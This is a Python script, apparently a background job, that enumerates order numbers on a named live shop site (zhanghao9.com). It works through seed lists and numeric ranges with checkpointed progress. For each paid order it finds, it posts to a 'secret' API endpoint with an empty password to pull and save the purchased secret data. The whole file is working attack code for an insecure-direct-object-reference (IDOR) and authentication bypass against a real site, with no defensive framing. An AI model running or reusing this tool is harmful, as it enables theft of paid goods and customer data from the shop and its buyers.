#!/usr/bin/env python3
"""zhanghao9 订单号枚举后台（多轮策略 + 断点）。"""
from __future__ import annotations

import argparse
import json
import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
OUT_DIR = Path("/data/tools/faka/out/zh9")
if not OUT_DIR.parent.exists():
    OUT_DIR = ROOT / "out" / "zh9"
OUT_DIR.mkdir(parents=True, exist_ok=True)

PROGRESS = OUT_DIR / "order_enum_progress.json"
LOG = OUT_DIR / "order_enum_bg.log"
HITS = OUT_DIR / "order_enum_hits.jsonl"
ENUM = ROOT / "order_enum.py"
SEEDS = ROOT / "data" / "zh9_trade_seeds.txt"


def log(msg: str) -> None:
    line = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}"
    print(line, flush=True)
    with LOG.open("a", encoding="utf-8") as f:
        f.write(line + "\n")


def load_progress() -> dict:
    if PROGRESS.exists():
        try:
            return json.loads(PROGRESS.read_text(encoding="utf-8"))
        except Exception:
            pass
    return {"phase": 0, "done": []}


def save_progress(state: dict) -> None:
    PROGRESS.write_text(json.dumps(state, ensure_ascii=False, indent=2), encoding="utf-8")


def run_round(name: str, extra: list[str]) -> int:
    cmd = [
        sys.executable,
        str(ENUM),
        "-u",
        "https://zhanghao9.com",
        "--proxy",
        "none",
        "--out",
        str(HITS),
        *extra,
    ]
    log(f"ROUND {name}: {' '.join(extra)}")
    p = subprocess.run(cmd, cwd=str(ROOT), capture_output=False)
    return p.returncode


def try_secret(trade_no: str, order_id: str) -> None:
    import requests

    base = "https://zhanghao9.com"
    for payload in (
        {"orderId": order_id, "password": ""},
        {"tradeNo": trade_no, "password": ""},
        {"orderId": order_id, "tradeNo": trade_no, "password": ""},
    ):
        try:
            r = requests.post(
                base + "/user/api/index/secret",
                data=payload,
                headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"},
                timeout=15,
            )
            j = r.json()
            if j.get("code") == 200 and j.get("data"):
                log(f"[+] SECRET HIT trade={trade_no} payload={payload} -> {j}")
                (OUT_DIR / f"secret_{trade_no}.json").write_text(
                    json.dumps(j, ensure_ascii=False, indent=2), encoding="utf-8"
                )
                return
        except Exception as e:
            log(f"secret err {trade_no}: {e}")


def harvest_paid() -> None:
    if not HITS.exists():
        return
    for line in HITS.read_text(encoding="utf-8", errors="ignore").splitlines():
        try:
            row = json.loads(line)
        except json.JSONDecodeError:
            continue
        if row.get("tag") != "order_found":
            continue
        if not row.get("paid"):
            continue
        d = row.get("data") or {}
        trade = row.get("trade_no") or d.get("trade_no")
        oid = str(d.get("id", ""))
        if trade and oid:
            try_secret(str(trade), oid)


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser()
    ap.add_argument("--once", action="store_true", help="只跑当前 phase")
    return ap.parse_args()


def main() -> int:
    args = parse_args()
    state = load_progress()

    phases = [
        ("seeds-exact", ["--exists-only", "-f", str(SEEDS), "-w", "10"]),
        ("seeds-vary9", ["--exists-only", "-f", str(SEEDS), "--vary-last", "9", "-w", "25"]),
        ("seeds-vary9-paid", ["--paid-only", "-f", str(SEEDS), "--vary-last", "9", "-w", "25"]),
        ("prefix903-suffix", ["--exists-only", "--prefix", "903", "--middle", "26070403", "--start", "2640000", "--end", "2655000", "-w", "30"]),
        ("prefix116-suffix", ["--exists-only", "--prefix", "116", "--middle", "26070403", "--start", "2640000", "--end", "2655000", "-w", "30"]),
        ("prefix441-suffix", ["--exists-only", "--prefix", "441", "--middle", "26070403", "--start", "3540000", "--end", "3565000", "-w", "30"]),
        ("prefix903-paid", ["--paid-only", "--prefix", "903", "--middle", "26070403", "--start", "2640000", "--end", "2655000", "-w", "30"]),
        ("prefix441-paid", ["--paid-only", "--prefix", "441", "--middle", "26070403", "--start", "3540000", "--end", "3565000", "-w", "30"]),
        ("wide903", ["--exists-only", "--prefix", "903", "--middle", "2607040", "--start", "300000000", "--end", "300005000", "-w", "30"]),
    ]

    start = state.get("phase", 0)
    log(f"START phase={start}/{len(phases)}")

    for i in range(start, len(phases)):
        name, extra = phases[i]
        if name in state.get("done", []):
            continue
        rc = run_round(name, extra)
        state["phase"] = i
        state.setdefault("done", []).append(name)
        save_progress(state)
        harvest_paid()
        if rc != 0:
            log(f"round {name} exit={rc}")
        if args.once:
            break
        time.sleep(3)

    harvest_paid()
    log("DONE order_enum_bg")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
